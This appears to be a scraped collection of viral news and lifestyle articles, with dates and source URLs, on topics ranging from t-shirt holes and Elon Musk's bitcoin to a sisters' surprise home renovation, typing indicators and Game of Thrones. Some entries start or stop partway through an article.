""The fabric there is (rubbing) against the hardware: your belt, the tops of your jeans, all points of wear. The friction, repeated over time, has caused the fabric to deteriorate.""

But what can you do to combat these pesky little holes and keep your t shirts looking good as new?

Advert 10





Well, Bayard goes on to say that the fabric of the t-shirt is mostly to blame, so that's where we need to make the change.

""The garment itself might be produced as cheaply as possible,"" he said. ""Cutting costs where possible.

Advert 10

""Look for brands that call out what type of cotton they are using - a longer fibre length is a good sign - and how the garment is constructed.""

So, there we have it, you can either buy more expensive clothes or stop wearing jeans and belts. Neither of those are an ideal solution for me, to be honest.

Having said all that, the teeny holes could well be down to moths, the pesky little buggers do enjoy dining on clothing after all.

Apparently, the easy way to tell if its your jeans wrecking your clothes or a bunch of moths is to check for the number of small holes. If there's a cluster of holes, it's likely due to moths making a snack out of your clobber, however, if it's just one small hole, then you can probably blame your jeans.

The co-founder of Tesla Inc. revealed on Twitter that he owns only a tiny fraction of one bitcoin token.

""I literally own zero cryptocurrency, apart from .25 BTC that a friend sent me many years ago,"" Musk confessed. Using today's bitcoin price of about $10,000 a coin, that translates to $2,500.

The serial entrepreneur – whose net worth tops $20 billion – made the revelation in response to a question about an online scam where random users pose as celebrities (like Musk) in a bid to steal people's cryptocurrencies. (See also: IRS Wants to Tax Your Bitcoin Gains: Orders Coinbase to Turn Over User Data.)

Musk's indifference to bitcoin probably wasn't a shock to his fans, since he recently revealed that ""a friend sent me part of a BTC a few years, but I don’t know where it is."" (See also: Elon Musk: Education, Success Story and Net Worth.)

Is Elon Musk Satoshi Nakamoto?

In November 2017, Musk denied rumors that he was Satoshi Nakamoto, the mysterious inventor of bitcoin. The brouhaha erupted after a former SpaceX intern, Sahil Gupta, in a blog post on Medium, wrote ""Satoshi is probably Elon.""

Gupta reasoned: ""Elon is a self-taught polymath. He’s repeatedly innovated across fields by reading books on a subject and applying the knowledge. It’s how he built rockets, invented the Hyperloop (which he released to the world as a paper), and could have invented Bitcoin.""

The true identity of Nakamoto has never been confirmed, but there has been a steady stream of speculation about who he is ever since bitcoin quietly launched in 2009. (See also: Tesla CEO Elon Musk Denies Being Bitcoin Creator.)

Meanwhile, Musk isn't the only billionaire who's skeptical of bitcoin and the crypto phenomenon. Bitcoin cynics are put off by the virtual currency's erratic price movements, lack of regulation, and absence of a valuation guarantee because it's not backed by a central bank.

Billionaire Charlie Munger, the second-in-command at Berkshire Hathaway, slammed bitcoin as a ""noxious poison"" and called the media hype surrounding digital currencies ""totally asinine.""

Similarly, Munger's boss, mega-billionaire Warren Buffett, predicted that cryptocurrencies will almost certainly ""come to a bad ending."" (See more: Bitcoin Is 'Poison,' Says Berkshire Billionaire Charlie Munger.)

And in its latest letter to clients, the Paul Singer-led Elliott Management, which oversees $34 billion in assets, excoriated cryptocurrencies as a bubble, a scam and a fraud. “This is not just a bubble,"" Elliott wrote.

Freedom and Michael Eubanks’ second child’s birth date was due to be Sept. 3, and they planned to name her Violet.

But the couple changed their mind after Freedom went into labor almost two weeks early and gave birth at Greenville Memorial Hospital at 8:04 a.m. Monday.

“I kind of felt like it was meant to happen, to have her on this day,” Freedom Eubanks told ABC News.

“I think it was just meant to be, her name,” added the mom of two, from Spartanburg. “We’re probably going to call her Clipsey.”

Eclipse Alizabeth Eubanks, as the newborn is now legally known, wasn’t the only baby born in the hospital Monday.

",1/08/2018 14:00,https://www.rd.com/article/cops-touch-cars-tail-light-traffic-stops/,"Nope, it's not because they're trying to buff out that scratch above your bumper.

Say you’re driving on your local road, and you enter a construction zone. The construction is wrapping up for the day, the sun is coming down, and you just miss the “Reduce Speed Ahead” sign. You come to the Stop sign and notice a state trooper pulled up behind you. The trooper’s flashers turn on, and you realize that you may have been speeding. Better brush up on the 10 tricks to beat any speeding ticket!

You pull over, and as the officer approaches the car, you hear a quick tap on the back of your car. The officer touches your tail light as he came to your window, and you come to realize that you’ve seen this before. Actually, you’ve seen this quite a bit. Police officers will often briefly tap your car’s tail light before approaching the window.

This common cop practice isn’t rooted in superstition, and it isn’t a secret. As it turns out, it’s based in the officer’s well-being.



According to criminal defense attorney and DWI/DUI lawyer Joe Hoelscher, this routine maneuver serves as a sort of bread crumb left to prove that the police officer had approached that particular vehicle. “Leaving a thumbprint on the brake light is an old-school way to tag a car with a fingerprint, so it can be identified conclusively as the vehicle involved in a stop should the officer become incapacitated,” explains Hoelscher. Basically, if the officer’s safety were to be jeopardized by the driver, or if the car fled, investigators could track that fingerprint to the suspect in question. Who knew?! Plus, find out more explanations for little things you’ve always wondered about.

Why is it “old-school”? Before dash cams and body cams, the fingerprints left on the tail light served as a primary form of evidence about the traffic stop. But, despite all of that new technology, you probably will still see cops do this. “It is less important now that video is ubiquitous, but it requires so little effort that officers are still trained to do it,” Hoelscher explains.

Another theory suggests that the tap can serve as a means of jarring an intoxicated driver or a driver in possession of illegal materials. But Hoelscher claims that this isn’t true. On the contrary, “officers should do it subtly so the driver doesn’t realize it’s there,” he says. “Otherwise, a perpetrator could remove the print.”

Hoelscher even suggests a way to use this common cop behavior to your advantage. He notes that when a car’s tail lights are dusty, the cop’s fingerprint can stand out. If this is the case for your car, “the next officer might be more aggressive realizing you’ve had another law enforcement interaction recently.” So, he says, “my advice is to wash your car after getting a ticket or the next time you get stopped.” And there are more tips where that came from with these 45 secrets police officers want you to know.",This Is Why Cops Touch Your Car’s Tail Light During Traffic Stops,

Scotland’s Aldwych Café and Ice Cream Parlor is dishing up what they’ve deemed the world’s “most dangerous ice cream”.

You have to be 18 years or older just to get a taste. Even if you pass the adult test, you’ll still need to sign a waiver warning of the ice cream’s “risk of personal injury, illness, and possible loss of life”.

Okay, maybe make sure your date is okay with that whole risk of death thing.

The makers of Respiro Del Diavolo – Italian for “Breath of the Devil” – claim the velvety red ice cream is 500 times hotter than Tabasco sauce. The Carolina Reaper pepper used comes in at a whopping 1,569,300 SHU on the Scoville scale – a measurement of pungency (spicy heat) of chili peppers.

It’s so hot, the staff say they have to wear gloves when handling the ice cream.

We’re not totally sure what's in the recipe, though the owners say it comes from a secret family recipe dating back to 1936.

Food is made spicy by an active component called capsaicin that acts as an evolutionary tool meant to dissuade potential eaters with physical pain. When consumed, capsaicin binds to pain receptors in nerves called TRPV1 in the same way heat sends warning signals to your brain through pain, hence the burning sensation in your mouth. The body reacts to this threat by removing it by overheating, sweating, rushing blood to your face, tearing up eyes, and runny noses.

Eating spicy foods takes an acquired taste that comes from eating them, becoming desensitized, and building up a tolerance. If you’re one of those people who doesn't understand how someone could stand spicy foods, then you’re not alone. One study suggests men who smother their food in spicy stuff might have higher levels of testosterone, while another paper suggests men who walk on the spicy side do it for the attention and thrill (typical).

Whether your seeking a thrill or looking to impress your date, this ice cream is sure to hit the spot. Plus, it's pretty cheap. The owners say it won't cost any more than their regularly priced ice cream scoops.

That’s because one brave Russian decided to find the answer; it was not good.

Brilliant YouTuber Garage 54 ENG, who recently put wooden pistons into a VAZ-2106, did something even dumber (or, arguably, more brilliant) a few weeks ago: he stuffed a plastic bag full of Mentos under his car’s valve cover right against the timing chain sprocket, and filled the engine to the very brim with 21 liters of Coke:

“Everything is in perfect order,” the host says (translated from Russian by BMI Russia). “Our baggy is in place, so is the battery. Now we try firing it up.”

But the engine doesn’t turn over.

So the host switches to another battery, but still nothing. After bumping the ignition a bunch of times, the engine eventually cranks over, and shoots Coke from its oil filler tube (likely due to the pistons pumping it out, not from the Mentos reaction):

“Sunova bitch! Start already!” the mechanic exclaims as the motor refuses to fire. But the old VAZ never springs to life.

According to the host, the cola’s low viscosity meant the soda made its way past the piston rings and into the combustion chamber, thwarting any chance of ignition. The wrencher drained some of the Coke onto the ground to try to reduce the chance of any getting into the combustion chamber, but by that time, the engine had seized up.

Which, if we’re honest, is not a surprising result. Coca-Cola isn’t exactly known for its lubrication abilities. So yes, this idea was as dumb as it sounded when you first read the headline. But I think it was definitely worth doing, if only to satisfy a curiosity I never knew I had.",Here Is What Happens When You Fill A Car's Engine With Coke And Mentos,

It’s also about having a practical device close at hand that will help you keep track of the time as you go about your day… right?

Well, there’s now a trend among watch collectors to purchase stylish timepieces that don’t actually work, making them void of any useful function altogether.

Recommended 10 best watches for men

So, what is the point of wearing a watch that, to put it frankly, is broken?

According to The Wall Street Journal, it’s all about prioritising style over substance.

Men’s fashion editor Jacob Gallagher explains that men who follow this trend may have been inspired by artist Andy Warhol, who often wore a Cartier Tank watch that didn’t tell the correct time.

“I don’t wear a Tank watch to tell the time,” Warhol stated in 1973. “Actually I never even wind it. I wear a Tank because it is the watch to wear!”

While some may view the practise of wearing an inoperative watch as strange, others would argue that there is logic in keeping up appearances.

Stephen Viscusi, author of On the Job: How to Make it in the Real World of Work, is of the opinion that wearing a wristwatch could be a make or break decision when applying for a job.

“My advice to you millennials who use your phones as timepieces is simple: cut it out! Go buy a wristwatch!” Viscusi wrote for Huffington Post.

“It may be a gimmick, but believe me, it will separate you from everyone else your own age interviewing for the same job.”

While the notion of wearing a luxurious wristwatch may not be feasible for those unwilling to dish out thousands of pounds on a gadget that has no function, others may work around this by renting watches for a fraction of the price.

Shlomo Gelernter, a real estate broker from Manhattan, explained to The Independent that he wears flashy watches every single day by leasing them temporarily.

“It’s just like having a nice car, or a nice house. People’s perception of who you are changes instantaneously, without even speaking a word to you, when they notice a luxury timepiece on your wrist,” he said.

Parents Return Home & Find Their Daughters Doing The
Unthinkable

",31/07/2018 14:01,https://bridesblush.com/inspiration/teens-surprise-parents-fb-yh/,"

Out Of Left Field Hardworking parents of teenagers often dream of taking a long vacation with the hopes that their kids won’t destroy the house while they’re gone. The Schoonovers, however, found a surprise that really blew their minds.

Vacationer’s Dream The Schoonover family may live in the popular vacation spot of North Myrtle Beach, South Carolina, but that didn’t mean Karen and Chip still didn’t need to get away from home now and again. Precarious as it might have seemed, they figured their four daughters were old enough to hold down the fort, and they decided to take a week-long trip one December. They never expected the surprise their children would concoct during their time away from home.

The Four Hs With each successive girl that joined the Schoonover family, Karen and Chip decided that each of them should have a name that started with “H.” Heather is their eldest daughter, and she had already left home several years before the incident when she got married. Her younger sisters, Hollie, Halice, and Haley were determined to enlist her into their scheme. As their parents set off for vacation, the girls were ready to set their plan into action.

The Shining Light Hollie was the mastermind behind the plan to surprise their parents. As the second oldest, she was best placed to organize her three sisters. The moment their parents were out of the house, the four girls sprang into action, as they hoped they could work together in order to pull off the greatest Christmas surprise their parents had ever seen. Hollie smartly had the youngest sister Haley set up her camera and start recording from the beginning, as their plan had several layers to it.

A Star In The Making Even though the plan was Hollie’s by design, she never quite aspired to become an interior designer. In fact, Hollie had always harbored loftier ambitions, as she hoped to become a working actress and singer. Entertainment is not an easy industry to break into, however, so in the meantime, she has begun offering her services to friends and family as a makeup artist. It’s a career path she hopes will materialize as she continues her training.

Snapshots Of Time If Hollie loved to be in front of the camera, youngest sister Haley loved to be behind it. The two sisters have often used each other in order to practice their respective arts, as Hollie would do her sisters’ make up, and Haley would capture the final product. In terms of the Christmas gift the girls were hoping to give their parents, Hollie and Haley’s artistic vision and skills were a perfect match for what they were planning.

Taking A Study Break While her two more artistic sisters chose a less traditional path as they sought to make their names in more visual mediums, Halice wanted to follow her eldest sister’s path and attend university. Halice didn’t stray too far from home when she matriculated into Coastal Carolina University. She wasn’t the first in the family to attend the school though, as Heather charted the same path several years before. Upon finishing her Bachelor’s degree, she wants to go to graduate school for physical therapy.

Back To Her Roots The three younger sisters may have had slightly more stake in their Christmas gift given that they’re all still local to North Myrtle Beach, while their eldest sister has broken from the mold. She still resides in South Carolina, but has moved further inland with her husband, where she works in marketing for a real estate company. Even so, it was important to Heather to return home and help her sisters make a dream come true for their parents.

Making Big Moves The Schoonover family may feel like an integral part of the North Myrtle Beach community, but that wasn’t always the case. All four of the girls were born in Seminole, Florida, where they spent the better part of their childhoods. After their relocation, however, the whole Schoonover family began to really feel that North Myrtle Beach was where they were meant to be. This love of their home made the girls’ gift all the more meaningful to them.

Racking Up The Views It was the Schoonover sisters’ luck that they made a video of just what they were doing in the house while their parents were away, as it quickly took over the internet. Users flocked to their humble YouTube video in droves, feeling just as overwhelmed by the end of it as the girls’ parents felt when they returned from their trip. The viewers they touched then sent the video to their friends, making the impact of their surprise even greater.

Starting From The Bottom The girls were hoping to give their home a little bit of a makeover while their parents were away. Though some children think that simply cleaning up the house is enough of a gift for hard-working parents, the girls wanted to take things a step further. However, they didn’t realize just how much work they’d be taking on. Not only that, none of them had ever engaged in this sort of home renovation before, making it uncertain if they’d pull off their Christmas gift.

Out With The Old The girls wanted to be as thorough as possible when it came to updating their home without their parent’s knowledge. Cleaning things up was just going to be a start. As they surveyed the rooms they planned to tackle, all the girls could see were mountains of junk that needed to be removed. Despite thinking it might take only a few hours at most to sort through all of the stuff, their first step took the better part of the day.

A Clean Slate Their home renovation wasn’t going to get any easier as the girls moved on to the real renovation tasks at hand. Hollie may have thought they were being overly ambitious with their design plan, but even so, they pressed forward, ripping out all of the old carpeting in the process. As they muddled their way into the bulk of the most strenuous work, the girls discovered that the best way to dispose of the old carpeting was by throwing it out of a window.

I Get By With A Little Help From My Friends Perhaps the girls were inspired by the myriad of home makeover shows which depict families receiving a dream house in the blink of an eye, but it quickly became apparent that they’d underestimated just how long their Christmas gift was going to take them to complete. The girls figured it couldn’t hurt to recruit some extra workers, and they knew just the boys for the job. They just had to hope they had the muscle around when they needed it most.

Pooling Together As Hollie and her sisters plotted the gift of a lifetime for their parents, they wanted to make sure that as much of the decor was as updated as possible. That meant not only cleaning up and painting, but also chipping in to buy some new furniture for the living room. The girls would find, however, that getting new furniture was far easier than disposing of the old. Despite their collective muscle, they documented a hilarious struggle to push their old couch off the porch and into the yard.

Flexing Their Abilities The four girls might have quickly discovered just how strenuous of a task they had taken on, but not all of them were strangers to physical activity. Eldest sister Heather often hosts workout accountability groups, helping others to stay on track to achieve their fitness and wellness goals. Halice is another one of the Schoonover sisters to have fitness on her mind, as she was in the middle of studying for a degree in exercise and sports science during the house renovation.

Playing To Their Strengths Being so close in age definitely had its advantage for the Schoonover sisters, as they were no strangers to working together. Such a big project like renovating their whole house in a week would have been impossible if they weren’t able to band together and use each girls’ strengths in order to keep pressing forward. When they were younger, the girls would work together in much the same way as they pursued a family past time of geocaching.

Hitting The Hurdles Anyone who has undertaken a serious project can understand that often, as you near the midpoint of your work, you feel that you’ve been slogging on for ages with no end in sight. The girls felt like they were hitting their breaking point, and yet they were only on their third day of work. As they surveyed their progress, all they saw was a house in shambles and many tasks to be completed that were far beyond any of their expertise.

Looking For A Boost As dawn rose over the chilly morning, the girls grumbled their way out of bed, pulling on their old, dirty clothes in preparation for the day’s work. None of them had slept much the night before, and they were struggling to stay motivated, as their house was nearly unlivable. In order to get themselves into work mode, one of the girls came home with a pack of energy drinks, in which the rest of her sisters happily partook.

Wearing Them Down Despite the extra help they had enlisted, painting every single room in the house was an undertaking far more serious than what the girls could have possibly expected. They might have thought that moving furniture was going to be the hardest part, but when they found themselves still painting the edges of the windows in one room late into the evening, it took all of their collective encouragement to convince each other not to call it quits.

Feeling The Physical Strain The week was more than halfway through, and the girls still had a mountain of work in front of them. They weren’t just tired from the lack of sleep. As they noted in their video, their backs were beginning to hurt, and their legs were still sore from the amount of standing they’d done so far. It was love for their parents that continued driving their project, even as the girls felt a little bit like they were floundering.

Finding Their Numbers Depleted The days kept stretching on ahead of the girls, but little by little, they were making progress. If they thought the previous day had been tough, however, they would find their struggle would increase, as only Haley and Hollie were available to put in time on the house on the fifth day of their renovations. The girls didn’t want their lack of numbers to affect the progress they could make significantly, and they knew they were in the home stretch.

All By Themelves Haley took the camera for herself to document the progress the two girls had made by themselves on day five. Hollie sat on the floor of the dining room, slowly painting details on the wall in a pale blue. Haley explained that it had been just the two of them, but even so, a major accomplishment had occurred. The two girls, all on their own, had installed the new carpets in place of what they’d tossed in the trash.

Up All night It was 7 AM when the alarm rang, rousing Hollie and Haley from their much-needed sleep. The girls had been determined to keep working until they literally couldn’t go on anymore, as the kitchen was only half painted. Half of the cabinets needed their second coat of paint while the other half needed their first coat of paint. It was their final day to get work done before their parents arrived home the next morning, and the gift needed to be complete.

Hearts On Their Sleeves It was Hollie who took the camera in the car on the morning of day six if only to show off to their parents just how tired they were. When asking Haley how she felt, she responded, “I feel like I’m in the army.” Hollie got candid with the camera, showing off her “stress acne” that had flared up around her face. They needed to put the finishing touches on the rest of the painting, and then put all the furniture back.

Using A Decoy The day their parents returned home from vacation was going to be a big one. With palpable excitement shimmering in their eyes, the girls prepared to share their incredible gift with their parents. They had one more trick up their sleeves, however. For starters, they wanted to throw their parents off the scent by surprising them with a visit from eldest sister, Heather. Heather drove over to the house, with a camera set outside, so she could greet her parents as they pulled in.

An Enticing Introduction “We’re so nervous,” whispered Hollie into the camera. As the girls watched their parents pulling into the driveway, they began filming for the final moments of their parents Christmas gift. However, when all was said and done, the girls decided to use part of this sequence as the opening to the video they would eventually post on YouTube. The girls scurried between the camera and the window, watching to make sure they caught their parents on time.

Uncovering Hidden Treasure Geocaching may not be the most common of family activities, even though there are millions of people who engage in the treasure hunt worldwide. The advent of smartphones that come equipped with GPS has lessened some of the fun of the search. The idea behind geocaching is that someone in the community will hide a little trinket somewhere in the world, only sharing the coordinates with the public. Those in the area would then put in the coordinates in order to uncover their little piece of treasure.

Off The Trail Karen and Chip Schoonover pulled into their driveway feeling refreshed from their week away, but immediately, they knew something felt different. As they left the car, Karen stood, inspecting the yard, trying to put her finger on what had changed when her four daughters walked out of the house together. Karen and Chip had only expected three. “Hey! Hey! What are you doing here!” Karen exclaimed to Heather. Both parents were overcome with surprise and joy at seeing their daughter home.

Judging A Book By Its Cover Karen could see that there was a noticeable difference in the facade of her house, prompting her to ask her kids, “Alright, who cleaned?” Seeing Heather standing with her three sisters was more than Karen could have hoped for, though she had also secretly wished the girls might have tidied up things inside too. From how things looked on the outside, Karen could see their cleaning had likely gone beyond what she’d expected, but she didn’t know just how much they’d really done.

It’s Not Over Yet As the girls had planned, Heather was going to tell their parents, “Your surprise isn’t over yet” before leading them inside to see the work they’d done. Neither Karen nor Chip could fathom what had occurred in the week they’d been away. The girls advised their mother to “take a deep breath” before leading both parents inside of the newly renovated house. Karen and Chip stepped through the threshold and proceeded to have their minds completely blown.

Cards On The Table Karen’s jaw dropped. “What!” she shrieked. As she took in the house around her, she felt like she had stepped into a completely different world. “What did you do!” The surprise in her voice couldn’t be contained, as Karen brought her hands to her mouth while continuing to make her way through the renovated house. It wasn’t just clean as she had hoped, her daughters had completely updated the kitchen. Karen couldn’t fathom how much more was in store.

Rewards Of A Challenge Karen and Chip stepped from the entryway into the kitchen, and Karen quickly found herself overwhelmed by emotion. Tears streaming down her face, she marveled at the sleek new look her daughters had designed for their kitchen. They had painted the walls a comforting, pale blue while accenting it with striking brown cabinets. They’d even managed to replace the old countertops with gleaming slabs of polished marble. The girls insisted there was still more to see.

Dining In Style Karen took off her glasses in order to wipe away the tears, while simultaneously walking into the dining room. She had never even considered that her daughters would give her such a gift, as she could see that their hard work had also extended to the other common areas of the house. The change was astounding. The girls giggled and cried alongside their mother, feeling pride in all they had accomplished, and still she hadn’t seen what they did to the rest of the house.

Updating Their Comfort The girls led their parents into the master bedroom, excited to show that they had taken care of every single detail. Karen practically danced into the room, feeling the soft carpeting give way under her feet. Chip stood at the doorway in shock, hardly daring to breathe as he took in the huge change. Karen might have been effusive, but Chip was stoic in his surprise, staring at each new discovery with his jaw nearly hitting the floor.

Shining With Gratitude The Schoonover parents could hardly understand what had prompted their daughters to embark on such an intense transformation mission. No stone had been left unturned. Even the master bathroom had been redone, from the tub and shower to the fresh coat of paint that the girls applied. They even made sure they updated all of the accouterments that went with the decor of each room. To Karen and Chip’s surprise, they hadn’t seen the last of it.

An Open Invitation Karen and Chip were still in shock when the girls ushered them out of their bedroom and into the guest bedrooms. They had beautifully made it up in the same style and color scheme as the rest of the house. Like with the other rooms, the bedsheets, comforters, and curtains were all new. The astonished parents could help but feel pride that they’d raised such thoughtful daughters. It was clear they had put in not only an extensive amount of time but also money.

Looking Ahead As the video that the girls took of the transformation comes to a close, they explain to their shocked parents that they wanted to give them the best Christmas present they had ever received. It’s clear, especially from the before and after pictures, that the girls had taken on an extraordinary project for themselves. Karen and Chip were pleased to not only have received a new home, but to see just what incredible young women their daughters had become.

The Internet Takes Note Shortly after the surprise was revealed, Hollie added the video of their renovation to her YouTube account. It was the first video she had ever posted, but it didn’t go unnoticed. Little by little, the views began to climb, as first hundreds, then thousands of people began tuning in to see the girls’ story. Within a few months, the girls had garnered nearly 115 thousand views on the video of their Christmas surprise. The moment was not going to stop there.

Discovering Their Fame Hollie may have dreamed of getting her name out there, but she never expected it would be because she and her sisters gave their parents such a special Christmas gift. As the video she posted wormed its way around the world, many wanted to help share their incredible story. Unbeknownst to Haley, Hollie, Heather, and Halice, their video was going viral, and with it, their story. The girls couldn’t have been more excited to see how many people they were reaching.

Seeing It In Print It was Haley who caught wind of just how far their story spread when she happened to see her and her sisters when she was scrolling through her Facebook feed and suddenly stumbled upon a picture of her and her sisters. She knew immediately that someone had seen their video, and couldn’t wait to share the article with the rest of her family and friends who had been such an integral part of their big surprise.",Parents Return Home & Find Their Daughters Doing The Unthinkable,

People are only just noticing a secret message in Gamecube’s logo, and to be honest it’s blowing our minds.

So as we all know, it’s a very recognisable logo. It’s a cube – cute, right?

Well did you notice that it also incorporates a ‘G’ and a ‘C’? Yup, that’s correct. For Gamecube. Similar to Homer Simpson having an ‘M’ in his hair and a ‘G’ in his ear for writer Matt Groening.

Take a look…

The purple is the ‘G’ and the negative space is the ‘C’. Clever.

Fans have also noticed something really odd about the Nintendo Switch logo, and once you see it – it can’t be unseen.

This Woman Noticed a Baby Dolphin Struggling on the Beach and
Did the Most Incredible Thing! - One Green Planet

",31/07/2018 10:54,https://www.onegreenplanet.org/news/woman-noticed-baby-dolphin-struggling-beach/,"A baby dolphin beached on Seapoint Beach in Ireland was lucky to be found by a fearless animal lover. Jenni Hänninen, originally from Finland and now living in the Irish city of Drogheda, was horse-riding with her friends on the beach when she suddenly noticed the young animal lying on the sand, clearly agitated and helpless.

The incredible rescue was captured on camera. Jenni told Independent.ie, “When I was younger I might have saved a couple of birds but nothing like this.”

“I just saw the first baby dolphin at the side of the water. I didn’t know who to call or if I should call the coastguard or someone.”

“So I went over to help and when I was coming back there was another one which was stranded as well. I didn’t even know they existed on the east coast.”

Thanks to the woman’s quick decision to step in and put the dolphin back in the water, the animals survived the dangerous beaching and went happily back into their ocean home, hopefully never to be in a similar situation and require rescue ever again.

Rescuing wildlife can save the animal’s life, but it should always be carried out responsibly, with extreme caution, and in a way that will not put the rescuer or animal in danger. Remember that you should always try to contact a professional before stepping in. For emergencies involving marine animals, check out a few marine animal rescue hotlines here.

What is Game of Thrones about?

Game of Thrones is based on George R.R. Martin’s epic fantasy series, A Song of Ice and Fire. The books are renowned for the detail with which they describe the fantasy world of the Seven Kingdoms of Westeros.

Martin based many segments of the book on British medieval history. Anyone familiar with Scottish medieval history, for example, may notice the similarities between one of the show’s most famous episodes, ‘The Red Wedding’ and the infamous ‘Black Dinner’, which took place in Scotland in 1440.

The resulting fantasy world sees bleak medieval-style plot lines mixed with more typical fantasy. For example, dragons, giants and undead creatures all exist, but many characters in the Seven Kingdoms have no real contact with them and live a life comparable to that of a medieval peasant.

The plotline follows a number of ‘houses’ who control the Seven Kingdoms, under the rule of the King or Queen, who rules from Kings Landing.

One of the houses followed most closely by the twisting, eight season plot, is House Stark. The leader of their house holds the title ‘The Warden of the North’ and their relatively Spartan existence is contrasted with the monarch ruling the capital, King’s landing. This creates the idea of a north-south divide in the Seven Kingdoms and many other effective political divisions are created and developed throughout the series.

How many seasons of Game of Thrones are there?

There are eight seasons of Game of Thrones, totaling 73 episodes.

Where was Game of Thrones filmed?

Filming locations spanned Northern Ireland, Croatia, Malta, Gozo and even Los Angeles.

Dubrovnik, in Croatia, became a key shooting location from series two onwards as it became the capital, King’s Landing. Game of Thrones tours are now a popular tourist attraction in the city. Castle Ward, in Northern Ireland, as well as Doune Castle, in Scotland, were both used as shooting locations for Winterfell, home of the Stark’s, and have attracted similar series tourism to the region.

Who is in the cast of Game of Thrones?

Many of the stars of Game of Thrones were relatively unknown before their parts in the series but have gone on to more starring roles since. One exception to this was the already very well-known, Sean Bean, who plays Ned Stark in season one.

Richard Madden (The Bodyguard) plays his son, Robb. His daughters, Sansa and Arya, were played by Sophie Turner (Dark Phoenix) and Maisie Williams (Early Man). Bran and Rickon Stark are played by Isaac Hempstead-Wright and Art Parkinson, and Ned’s illegitimate son, Jon Snow, is played by series lead Kit Harrington (How to Train Your Dragon: The Hidden World, Gunpowder).

Also prominent are Alfie Allen, Joe Dempsie, Iwan Rheon, Gwendoline Christie, Lena Headey, Peter Dinklage and Nikolaj Coster-Waldau. Over the series of eight seasons many characters come and go and Game of Thrones became infamous for killing off central characters.

Who wrote Game of Thrones?

Game of Thrones is based on a series of books by American author, George R.R. Martin. They are entitled, A Song of Ice and Fire. However, in the final series of the programme, the plot of the television series managed to overtake the existing plot of the books, as Martin was still working on the last book of the series, it is not yet released. This led to series writers having to develop the plot themselves and their ending was met with widespread criticism.

Martin told The Observer: “I don’t think [the TV series] was very good for me… The very thing that should have speeded me up actually slowed me down. Every day I sat down to write and even if I had a good day… I’d feel terrible because be thinking: ‘My God, I have to finish the book. I’ve only written four pages when I should have written 40.”

In its final episode, Game of Thrones upset many fans with a controversial ending, which quickly led to a petition to re-write the final season. Over a million signatures were collected and the series’ stars were forced to rush to the writing team’s defence. George R.R. Martin has since stated that the ending of his books will be different to that of the TV series.

What the 'Someone Is Typing' Bubbles in Messaging Apps Actually
Mean

",30/07/2018 15:39,https://gizmodo.com/what-the-someone-is-typing-bubbles-in-messaging-apps-ac-1827744443,"Whether it’s a series of blinking ellipsis or an explicit notification that “someone’s typing,” the messaging feature known as a typing indicator is both a useful tool and a source of anxiety for many people. But knowing more about how it works can at least limit the guessing games that cause us stress.

Advertisement

“Hi,” your boss types in the Slack DM, and then appears to type for 10 minutes. What the hell are they typing? What’s happening? Did they just type a sentence and walk away and this damned thing is continuously reassuring you that you’re definitely getting fired? Maybe.

Or, your significant other types, “we need to talk,” and the typing indicator keeps popping up and disappearing. Are they adding on to a thought? Are they constantly erasing what they just said, so they can say, “I’m just not into you” with the cleanest execution possible? Probably.

Like many people who work in an office these days, my interactions with co-workers are almost entirely relegated to Slack, a popular team messaging app. Outside of work, I use different messaging apps to keep up with friends and loved ones, and I’m allergic to phone calls. Someone is always typing. And like most people, I don’t think much about it unless it’s one of those potentially consequential incidents, at which point I turn into a neurotic basket case.

In the interest of limiting my own freak-outs, I reached out to David Auerbach, a software engineer and author who started as an intern at Microsoft when he was 22-years-old and joined the company full time in 1999. He was assigned to the team working on MSN Messenger Service, and he helped build the first typing indicator into a major product. (Auerbach last year became the subject of a controversy involving Breitbart, which he characterized as “obvious bullshit.”)

The first thing I wanted to know was whether Microsoft held a patent on type indicators that everyone else pays to license. Auerbach said that he’s sure there’s some patent out there, but he doubts any other companies are licensing it. “The way tech companies work is that everything gets patented, but it’s rarely enforced—it’s more of a mutually assured destruction mechanism,” he explains. The idea being that if Microsoft went to Facebook demanding it pay up for one patent, Facebook would just counter with one of its own patents that Microsoft is violating. Just last year, Microsoft patented a new “enhanced” typing indicator with some minor cosmetic changes. And there are all sorts of tiny, little patents related to keyboard inputs that would probably grind the tech world to a halt if they were rigorously enforced.

When Microsoft’s engineers first elected to add a typing indicator to Microsoft Messenger Service, it was at a time when the protocols of adapting real-world communication were still up in the air and emojis were still years away. But the notification served a more practical purpose than just humanizing communication: It let you know that the person you were speaking to was still on the line. “Back when it was a dial-up connection, someone could appear online that was actually disconnected because the disconnect wouldn’t register for a while,” Auerbach told me. This keep-alive mechanism just gave users another signal that they can rest easy that they weren’t speaking into the void. It was more a source of comfort than nervous anticipation.

Of course, the world in which we live today brings an assumption that everyone is connected all the time. We may shrug and give it a pass when someone says, “hey, sorry I just got this,” two days after we sent them a text, but we know they saw it far earlier. Still, more people using chat online means there’s a greater need for a traffic cop, and that’s where typing indicator’s serve their most valuable function today. When 1o people are in a group chat or 100 coworkers are communicating in a single Slack channel, the indicator lets us know that we might want to reconsider interrupting others.

In the case of Microsoft’s early implementation of the feature, Auerbach’s memory is a little fuzzy on how it exactly worked, but he believes the notification that someone was typing would be triggered on the first keystroke and repeat as more keystrokes occurred. If no keystrokes were registered after five or 10 seconds, the indicator would no longer be displayed on the other end. As far as he can remember, that was the only function—a user was either typing or not typing—and the addition of “Jane has entered text” came later.

For the most part, notifying users that someone has “entered text”—meaning, they wrote something but might not be actively typing—isn’t as widely used today as it was in the mid-aughts. Which also leads to the question of whether a service is simply saying someone’s typing when they merely entered text and stopped. We can’t say definitively that no service uses such an idiotic system today, but it’s highly unlikely. Not only would that be annoying, but back in Auerbach’s days at Microsoft, the team estimated that 95 percent of the messages flowing through the servers were just that constant repetition that someone was typing. Only 5 percent of the messages were actually the finalized communication being sent to a user.



Unfortunately, the fact that every service isn’t jumping off of Microsoft’s template means that everyone tends to tailor their typing indicators a little differently. It would probably take more time to explain the ways in which every messaging service offered by Google handles the feature than anyone would want to read. But just to take one example, Slack sent us a basic rundown of how its particular approach to typing indicators works:

Slack sends the typing indicator to you when a user is doing the following: Typing (as soon as they start typing, but not if they have only clicked in the text box)



When they are not issuing a slash command (ie. starting their input with /)



When they are not issuing keyboard shortcuts (ie. cmd+[ to switch channels or up arrow to edit)

If a user stops typing for 5 seconds, Slack removes the indicator that they are typing. Slack shows the following message templates in the indicator:

“Jane is typing” (one user)

“Jane and John” are typing (two users)

“Several people are typing” (three or more users) - fun fact on this, Slack’s blog

Advertisement

It’s also worth noting that you can turn typing indicators off in Slack.

